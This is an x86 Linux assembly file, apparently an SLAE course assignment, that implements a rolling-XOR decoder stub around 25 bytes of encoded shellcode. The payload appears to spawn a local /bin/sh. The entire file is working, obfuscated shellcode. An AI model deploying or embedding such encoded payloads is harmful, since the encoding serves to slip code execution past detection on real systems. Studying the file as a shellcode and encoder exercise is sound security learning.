; Title: Custom Encoder (Rolling XOR) - Linux x86 
; Author: DeathsPirate
; Twitter: @DeathsPirate
; Web: https://whitehatters.academy
; StudentID: SLAE-734

global _start

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	mov cl, 25
	xor eax, eax
	cdq
	mov al, 0x90
decode:
	mov dl, [esi]
	xor al, dl
	mov [esi], al
	mov al, dl
	inc esi
	loop decode
	jmp short Shellcode

call_decoder:
	call decoder
	Shellcode: db 0xa1, 0x61, 0x31, 0x59, 0x76, 0x59, 0x2a, 0x42, 0x2a, 0x5, 0x67, 0xe, 0x60, 0xe9, 0xa, 0x5a, 0xd3, 0x31, 0x62, 0xeb, 0xa, 0xba, 0xb1, 0x7c, 0xfc



